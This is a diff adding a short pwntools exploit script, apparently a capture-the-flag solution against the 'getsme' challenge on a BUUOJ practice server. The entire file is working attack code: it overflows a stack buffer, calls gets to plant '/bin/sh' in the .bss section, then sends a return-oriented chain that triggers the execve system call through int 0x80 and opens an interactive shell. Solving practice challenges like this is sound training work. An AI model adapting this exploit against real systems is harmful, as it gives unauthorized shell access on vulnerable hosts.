@@ -1,0 +1,22 @@
+from pwn import *
+context(os="linux",arch="i386",log_level="debug")
+#p=process("./getsme")
+p=remote("node5.buuoj.cn",27530)
+bss_addr=0x80eaf80
+pop_eax=0x80b81c6
+pop_ebx=0x80481c9
+pop_ecx=0x80de955
+pop_edx=0x806f02a
+gets_addr=0x804f120
+main_addr=0x80488a3
+int80=0x806cc25
+p.recvuntil(b"NAME!\n")
+payload1=b"a"*0x1c+p32(gets_addr)+p32(main_addr)+p32(bss_addr)
+p.sendline(payload1)
+p.sendline(b"/bin/sh")
+payload2=b"a"*0x1c+p32(pop_eax)+p32(0xb)+p32(pop_ebx)
+payload2+=p32(bss_addr)+p32(pop_ecx)+p32(0)+p32(pop_edx)+p32(0)
+payload2+=p32(int80)
+p.recvuntil(b"NAME!\n")
+p.sendline(payload2)
+p.interactive()
